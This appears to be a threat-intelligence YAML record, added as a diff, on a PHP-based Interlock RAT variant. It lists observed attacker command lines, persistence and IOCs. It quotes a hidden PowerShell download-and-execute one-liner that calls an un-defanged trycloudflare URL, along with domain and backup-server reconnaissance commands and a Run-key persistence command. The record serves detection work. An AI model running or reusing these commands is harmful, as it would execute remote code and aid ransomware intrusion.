@@ -1,0 +1,73 @@
+description: "New PHP-based Interlock RAT variant delivered via KongTuke web\u2011\
+  inject, executing PowerShell to spawn PHP with a config file."
+attribution: Interlock ransomware group
+malware_families:
+- Interlock RAT
+TTPs:
+  processes:
+  - powershell.exe
+  - cmd.exe
+  - php.exe
+  commandline:
+  - '''powershell.exe'' ''-ep Bypass'' ''-w H'' ''-c'' "schtasks /delete /tn Updater
+    /f; $w=New-Object System.Net.WebClient ; $w.Headers.Add(\"User-Agent\", \"PowerShell\")
+    ; $w.DownloadString(\"http://deadly-programming-attorneys-our.trycloudflare.com\")
+    | iex"'
+  - '''C:\Users\REDACTED\AppData\Roaming\php\php.exe'' ''-d extension=zip'' ''-d extension_dir=ext''
+    ''C:\Users\\AppData\Roaming\php\wefs.cfg'' 1'
+  - cmd.exe /s /c "powershell -c Get-NetNeighbor -AddressFamily IPv4 | Where-Object
+    { $_.State -ne 'Permanent' } |Select-Object @{Name='Interface'; Expression={$_.InterfaceAlias}},@{Name='Internet
+    Address'; Expression={$_.IPAddress}},@{Name='Physical Address'; Expression={$_.LinkLayerAddress}},@{Name='Type';
+    Expression={'dynamic'}} |ConvertTo-Json"
+  - cmd.exe /s /c "powershell -c 'systeminfo /FO CSV | ConvertFrom-Csv | ConvertTo-Json'"
+  - cmd.exe /s /c "powershell -c 'if ([Security.Principal.WindowsIdentity]::GetCurrent().Name
+    -match '(?i)SYSTEM') { 'SYSTEM' } elseif (([Security.Principal.WindowsPrincipal]
+    [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+    { 'ADMIN' } else { 'USER' }'"
+  - cmd.exe /s /c "powershell -c 'tasklist /svc /FO CSV | ConvertFrom-Csv | ConvertTo-Json'"
+  - cmd.exe /s /c "powershell -c 'Get-Service | Select-Object -Property Name, DisplayName
+    | ConvertTo-Json'"
+  - cmd.exe /s /c "powershell -c 'Get-PSDrive -PSProvider FileSystem | ConvertTo-Json'"
+  - 'cmd.exe /s /c "powershell -WindowStyle Hidden -Command ''echo AD_Computers: ([adsiSearcher]\"(ObjectClass=computer)\").FindAll().count''"'
+  - cmd.exe /s /c "powershell -Command "$searcher = [adsisearcher]'(&(objectCategory=user)(description=*))';
+    $searcher.PropertiesToLoad.Add('samaccountname'); $searcher.PropertiesToLoad.Add('description');
+    $results = $searcher.FindAll(); foreach ($result in $results) { $result.Properties['samaccountname'][0]
+    + ' - ' + $result.Properties['description'][0] }"
+  - cmd.exe /s /c "net user %%USERNAME%% /domain"
+  - cmd.exe /s /c "powershell -Command "$searcher = New-Object DirectoryServices.DirectorySearcher
+    '(&(objectCategory=computer))'; $searcher.PropertiesToLoad.Add('name') | Out-Null;
+    $searcher.PropertiesToLoad.Add('description') | Out-Null; $results = $searcher.FindAll();
+    foreach ($result in $results) { $computerName = $result.Properties['name'][0];
+    if ($computerName -match '(?i)VB|VBR|VEEA|VEEAM|BCK|BACK') { $desc = $result.Properties['description'];
+    if ($desc -and $desc[0]) { Write-Output \"${computerName} - $($desc[0])\" } else
+    { Write-Output \"$computerName\" } } }"
+  - cmd.exe /s /c "tasklist"
+  - cmd.exe /s /c "nltest /dclist:"
+  - cmd.exe /s /c "whoami"
+  - cmd.exe /s /c "dir %%appdata%%"
+  powershell: []
+  scripting_engine: []
+  registry_keys:
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load: []
+  network_connections: []
+  file_activity: []
+  persistence:
+  - reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "REDACTED" /t REG_SZ
+    /d "C:\Users\REDACTED\AppData\Roaming\php\php.exe C:\Users\REDACTED\AppData\Roaming\php\wefs.cfg"
+    /f
+  process_relations: []
+IOCs:
+- 28a9982cf2b4fc53a1545b6ed0d0c1788ca9369a847750f5652ffa0ca7f7b7d3
+- 8afd6c0636c5d70ac0622396268786190a428635e9cf28ab23add939377727b0
+- existed-bunch-balance-councils[.]trycloudflare[.]com
+- ferrari-rolling-facilities-lounge[.]trycloudflare[.]com
+- galleries-physicians-psp-wv[.]trycloudflare[.]com
+- evidence-deleted-procedure-bringing[.]trycloudflare[.]com
+- nowhere-locked-manor-hs[.]trycloudflare[.]com
+- ranked-accordingly-ab-hired[.]trycloudflare[.]com
+- 64[.]95[.]12[.]71
+- 184[.]95[.]51[.]165
+reference: https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
+date_of_publication: July 14, 2025
+file_creation_date: August 22, 2025
